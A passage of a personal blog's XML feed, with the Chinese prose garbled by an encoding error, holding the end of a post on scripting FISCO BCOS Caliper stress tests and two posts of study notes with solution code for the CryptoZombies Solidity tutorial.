title="ã€4ã€ä¸€åŠ³æ°¸é€¸"></a>ã€4ã€ä¸€åŠ³æ°¸é€¸</h3><p>ä¸Šè¿°é—®é¢˜è§£å†³åå°±å¯ä»¥ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬äº†ï¼Œå…¶å®è„šæœ¬å°±æ˜¯åœ¨åšä¸Šé¢çš„äº‹æƒ…ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å‘ç°è¿›è¡Œä¸€æ¬¡å‹æµ‹çš„æµç¨‹ï¼š<br><strong>å‰ææ˜¯å·¥ä½œè´Ÿè½½æ¨¡å—ã€åˆçº¦ã€SDKéƒ½å·²é…ç½®å®Œæ¯•</strong></p><ol><li>ä½¿ç”¨build_chain.shå·¥å…·ç”Ÿæˆç›¸åº”èŠ‚ç‚¹</li><li>ç¼–è¾‘docker-composeæ–‡ä»¶æŠŠæ‰€æœ‰èŠ‚ç‚¹éœ€è¦çš„dockerç¯å¢ƒé…å¥½ï¼ˆå¦‚æœæœ‰100ä¸ªèŠ‚ç‚¹ï¼Œå°±è¦å¤åˆ¶100énodeè¿›è¡Œä¿®æ”¹ï¼‰</li><li>ç¼–è¾‘config.yamlæ–‡ä»¶ï¼Œå°†æ‰€æœ‰éœ€è¦ç›‘æ§çš„å®¹å™¨åå­—æ”¾åˆ°dockernameä¸‹é¢</li><li>æ‰§è¡Œå‹æµ‹ä»£ç </li></ol><p>å¦‚æœç°åœ¨æœ‰ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬èƒ½å¤Ÿæ‰§è¡Œä¸Šé¢çš„æ‰€æœ‰äº‹æƒ…ï¼Œ<br>â€œ<strong>åªè¦è¾“å…¥èŠ‚ç‚¹æ•°é‡å°±èƒ½è‡ªåŠ¨å¼€å¯æµ‹å‹</strong>â€œçš„æ¢¦æƒ³å°†åœ¨ä¸‹é¢å®ç°:  </p><p><img src="https://img-blog.csdnimg.cn/afebe71297bb4d418d04ef63e6875053.gif"></p><p>è„šæœ¬åœ°å€ï¼š ğŸ‘‰ğŸ» <a href="https://github.com/xiaoyue2019/fiscoCaliperSc">xiaoyue2019</a></p><blockquote><p><em><strong>æ³¨æ„ï¼šä¸è¦ç›²ç›®ç›¸ä¿¡è¿™ä¸ªå°è„šæœ¬ã€‚æ­¤è„šæœ¬å¹¶ä¸èƒ½ä»é›¶å¼€å§‹ååŠ©æ­å»ºï¼Œè¿˜æ˜¯éœ€è¦æœ‰äº›åŸºç¡€çš„å–‚</strong></em></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ˜¯åœ¨ä¸€æ¬¡é¡¹ç›®ä¸­é‡åˆ°çš„é—®é¢˜:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;éœ€è‡ªå®šä¹‰åˆçº¦å‡½æ•°å‹æµ‹&lt;/li&gt;
&lt;li&gt;éœ€è‡ªå®šä¹‰é“¾èŠ‚ç‚¹æ•°é‡&lt;/li&gt;
&lt;li&gt;å¿…é¡»ä½¿ç”¨Dockeræ¨¡å¼æ­é“¾&lt;/li&gt;
&lt;li&gt;DockerèŠ‚ç‚¹éœ€è¦è‡ªå®šä¹‰é…ç½®(CPUã€å†…å­˜ç­‰)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é‚£ä¹ˆä½œä¸ºFisc</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="FISCOBCOS" scheme="https://x1a0.net/categories/FISCOBCOS/"/>
    
    <category term="Caliper" scheme="https://x1a0.net/categories/Caliper/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="fiscobcos" scheme="https://x1a0.net/tags/fiscobcos/"/>
    
    <category term="caliper" scheme="https://x1a0.net/tags/caliper/"/>
    
  </entry>
  
  <entry>
    <title>åŠ å¯†åƒµå°¸ç¬¬äºŒè¯¾è¿‡å…³å°è®°</title>
    <link href="https://x1a0.net/2021/12/19/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E7%AC%AC%E4%BA%8C%E8%AF%BE%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/19/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E7%AC%AC%E4%BA%8C%E8%AF%BE%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-18T16:01:13.000Z</published>
    <updated>2021-12-21T11:40:57.701Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€"><a href="#ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€" class="headerlink" title="ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€"></a>ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€</h3><p><img src="https://img.learnblockchain.cn/attachments/2020/02/Rlg50klq5e3d01469751f.png"></p><ul><li>ä»¥å¤ªåŠè´¦æˆ·åœ°å€å°±æ˜¯å…¬é’¥keccak256çš„å20ä½</li><li>åˆçº¦åœ°å€å’Œç”¨æˆ·åœ°å€æœ‰åŒºåˆ«çš„ï¼ŒåŒºåˆ«æ˜¯å•¥ä¸å¯è¨€ä¼ (ï¿£.ï¿£)</li></ul><p>æ˜ å°„å°±æ˜¯Pythoné‡Œé¢çš„å­—å…¸</p><ul><li>mapping (uint =&gt; address) public xx;</li></ul><p>é€šå…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">NewZombie</span><span class="params">(uint zombieId, string name, uint dna)</span></span>;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; address) <span class="keyword">public</span> zombieToOwner;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint) ownerZombieCount;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - <span class="number">1</span>;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ç¬¬ä¸‰å…³ã€Œmsg-senderã€"><a href="#ç¬¬ä¸‰å…³ã€Œmsg-senderã€" class="headerlink" title="ç¬¬ä¸‰å…³ã€Œmsg.senderã€"></a>ç¬¬ä¸‰å…³ã€Œmsg.senderã€</h3><p>msg.senderæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä»£è¡¨ç€å½“å‰è°ƒç”¨åˆçº¦çš„åœ°å€</p><ul><li>æ›´æ–°mappingå†…çš„å€¼ varmapping[id]++;</li><li>Pythoné‡Œé¢è¿™ä¸ªåªèƒ½æ˜¯å–å‡ºæ¥ï¼Œè¦æ›´æ–°è¿˜å¾—==ï¼Œå¥‡æ€ª</li><li>åˆšåˆšæµ‹è¯•äº†ä¸‹ï¼Œ+=123,varmapping=varmapping+123éƒ½æ˜¯å¯ä»¥çš„</li><li><strong>è¯´æ˜è¿™ä¸ªæ˜¯å–çš„åœ°å€è€Œä¸æ˜¯å€¼</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">NewZombie</span><span class="params">(uint zombieId, string name, uint dna)</span></span>;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; address) <span class="keyword">public</span> zombieToOwner;</span><br><span class="line">    mapping (address =&gt; uint) ownerZombieCount;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - <span class="number">1</span>;</span><br><span class="line">        zombieToOwner[id] = msg.sender;</span><br><span class="line">        ownerZombieCount[msg.sender]++;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ç¬¬å››å…³ã€Œrequireã€"><a href="#ç¬¬å››å…³ã€Œrequireã€" class="headerlink" title="ç¬¬å››å…³ã€Œrequireã€"></a>ç¬¬å››å…³ã€Œrequireã€</h3><ul><li>require(1==1) åªè¦åˆ¤æ–­ä¸ºTRUEå°±å¾€ä¸‹æ‰§è¡Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(ownerZombieCount[msg.sender] == <span class="number">0</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="ç¬¬äº”å…³ã€Œç»§æ‰¿-Inheritanceã€"><a href="#ç¬¬äº”å…³ã€Œç»§æ‰¿-Inheritanceã€" class="headerlink" title="ç¬¬äº”å…³ã€Œç»§æ‰¿ Inheritanceã€"></a>ç¬¬äº”å…³ã€Œç»§æ‰¿ Inheritanceã€</h3><ul><li>contract xiaobai is dog {å°ç™½çš„ç‰¹æœ‰å±æ€§}</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">contract ZombieFeeding is ZombieFactory &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ç¬¬å…­å…³ã€Œå¼•å…¥ã€"><a href="#ç¬¬å…­å…³ã€Œå¼•å…¥ã€" class="headerlink" title="ç¬¬å…­å…³ã€Œå¼•å…¥ã€"></a>ç¬¬å…­å…³ã€Œå¼•å…¥ã€</h3><ul><li>import â€œ./acontract.solâ€</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./zombiefactory.sol&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸ƒå…³ã€Œåƒµå°¸çš„DNAã€"><a href="#ç¬¬ä¸ƒå…³ã€Œåƒµå°¸çš„DNAã€" class="headerlink" title="ç¬¬ä¸ƒå…³ã€Œåƒµå°¸çš„DNAã€"></a>ç¬¬ä¸ƒå…³ã€Œåƒµå°¸çš„DNAã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./zombiefactory.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFeeding is ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">feedAndMultiply</span><span class="params">(uint _zombieId, uint _targetDna)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / <span class="number">2</span>;</span><br><span class="line">    _createZombie(<span class="string">&quot;NoName&quot;</span>, newDna);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å…«å…³ã€Œå‡½æ•°å¯è§æ€§ã€"><a href="#ç¬¬å…«å…³ã€Œå‡½æ•°å¯è§æ€§ã€" class="headerlink" title="ç¬¬å…«å…³ã€Œå‡½æ•°å¯è§æ€§ã€"></a>ç¬¬å…«å…³ã€Œå‡½æ•°å¯è§æ€§ã€</h3><p>internal å’Œ external</p><ul><li>privateåˆçº¦å¤–ä¸èƒ½è°ƒç”¨ï¼Œä½†ç»§æ‰¿çš„åˆçº¦ä¹Ÿè°ƒç”¨ä¸äº†äº†æ‰€ä»¥éœ€è¦internal</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€&quot;&gt;&lt;a href=&quot;#ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€&quot;&gt;&lt;/a&gt;ç¬¬äºŒå…³ã€Œæ˜ å°„å’Œåœ°å€ã€&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://img.learnblockchain.</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="åŠ å¯†åƒµå°¸" scheme="https://x1a0.net/tags/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8/"/>
    
  </entry>
  
  <entry>
    <title>åŠ å¯†åƒµå°¸è¿‡å…³å°è®°</title>
    <link href="https://x1a0.net/2021/12/17/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/17/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-17T01:00:42.000Z</published>
    <updated>2021-12-18T06:51:56.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è®°å¾—å½“åˆæœ€å¼€å§‹å­¦è¿™ä¸ªæ•™ç¨‹çš„æ—¶å€™å¥½åƒè¿˜æ²¡æœ‰ä¸­æ–‡,<br>åæ¥solidityéƒ½å¿˜å¾—å·®ä¸å¤šäº†ï¼Œå“ˆå“ˆï¼Œ<br>æ²¡æƒ³åˆ°æ•™ç¨‹ç‰ˆæœ¬æ²¡å˜ï¼Œ<br>é‚£å°±æ¥æ¸©ä¹ ä¸‹0.4.19å§ã€‚</p></blockquote><hr><h3 id="ç¬¬2å…³ã€Œåˆçº¦çš„åŸºç¡€ã€ï¼š"><a href="#ç¬¬2å…³ã€Œåˆçº¦çš„åŸºç¡€ã€ï¼š" class="headerlink" title="ç¬¬2å…³ã€Œåˆçº¦çš„åŸºç¡€ã€ï¼š"></a>ç¬¬2å…³ã€Œåˆçº¦çš„åŸºç¡€ã€ï¼š</h3><p>é€šå…³ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªå‘</p><ul><li>ç¼–è¯‘çš„æ—¶å€™è¦æŠŠæ³¨é‡Šåˆ æ‰ä¸ç„¶ä¸ä¼šé€šè¿‡</li><li>contractå’Œ{}ä¹‹é—´è¦åŠ ç©ºæ ¼</li></ul><p>æ³¨æ„ç‚¹</p><ul><li><code>pragma solidity ^0.4.19;</code> å…¶ä¸­^ä»£è¡¨ç€å‘ä¸Šå…¼å®¹</li></ul><hr><h3 id="ç¬¬3å…³ã€ŒçŠ¶æ€å˜é‡å’Œæ•´æ•°ã€"><a href="#ç¬¬3å…³ã€ŒçŠ¶æ€å˜é‡å’Œæ•´æ•°ã€" class="headerlink" title="ç¬¬3å…³ã€ŒçŠ¶æ€å˜é‡å’Œæ•´æ•°ã€"></a>ç¬¬3å…³ã€ŒçŠ¶æ€å˜é‡å’Œæ•´æ•°ã€</h3><p>é€šå…³ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹ï¼š</p><ul><li>çŠ¶æ€å˜é‡æ°¸ä¹…ä¿å­˜</li></ul><hr><h3 id="ç¬¬4å…³ã€Œæ•°å­¦è¿ç®—ã€"><a href="#ç¬¬4å…³ã€Œæ•°å­¦è¿ç®—ã€" class="headerlink" title="ç¬¬4å…³ã€Œæ•°å­¦è¿ç®—ã€"></a>ç¬¬4å…³ã€Œæ•°å­¦è¿ç®—ã€</h3><p>é€šå…³ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹ï¼š</p><ul><li>ä»£ç æ ¼å¼ï¼Œä¹˜æ–¹å·¦å³ç©ºæ ¼</li></ul><hr><h3 id="ç¬¬5å…³ã€Œç»“æ„ä½“ã€"><a href="#ç¬¬5å…³ã€Œç»“æ„ä½“ã€" class="headerlink" title="ç¬¬5å…³ã€Œç»“æ„ä½“ã€"></a>ç¬¬5å…³ã€Œç»“æ„ä½“ã€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie&#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>æ²¡å•¥è¦æ³¨æ„çš„ï¼Œæ³¨æ„ç»“æ„ä½“å®šä¹‰æ˜¯å¤§é©¼å³°å§</li></ul><hr><h3 id="ç¬¬6å…³"><a href="#ç¬¬6å…³" class="headerlink" title="ç¬¬6å…³"></a>ç¬¬6å…³</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>string[5] stringarr</li><li>int[] intarr</li><li>Person[] public persons</li><li>å›ºå®šé•¿åº¦ä¸º5çš„å­—ç¬¦ä¸²æ•°ç»„ã€ä¸å®šé•¿intå‹æ•°ç»„ã€ä¸å®šé•¿ç»“æ„ä½“æ•°ç»„</li></ul><hr><h3 id="ç¬¬7å…³ã€Œå‡½æ•°ã€"><a href="#ç¬¬7å…³ã€Œå‡½æ•°ã€" class="headerlink" title="ç¬¬7å…³ã€Œå‡½æ•°ã€"></a>ç¬¬7å…³ã€Œå‡½æ•°ã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createZombie</span> <span class="params">(string _name,uint _dna)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å½¢å‚å¼€å¤´ä¸€èˆ¬ç”¨_ï¼Œä¸‹åˆ’çº¿</li></ul><hr><h3 id="ç¬¬8å…³"><a href="#ç¬¬8å…³" class="headerlink" title="ç¬¬8å…³"></a>ç¬¬8å…³</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createZombie</span><span class="params">(string _name, uint _dna)</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name,_dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>arr.push == list.append()</li><li>arr.push(Struct(_a,_b))</li><li>æ•°ç»„æœ‰å°¾éƒ¨è¿½åŠ æˆå‘˜æ–¹æ³•ï¼Œå¯ä»¥ä¸æ–°ç”³æ˜ç»“æ„ä½“</li></ul><hr><h3 id="ç¬¬9å…³ã€Œç§æœ‰å‡½æ•°ã€"><a href="#ç¬¬9å…³ã€Œç§æœ‰å‡½æ•°ã€" class="headerlink" title="ç¬¬9å…³ã€Œç§æœ‰å‡½æ•°ã€"></a>ç¬¬9å…³ã€Œç§æœ‰å‡½æ•°ã€</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = 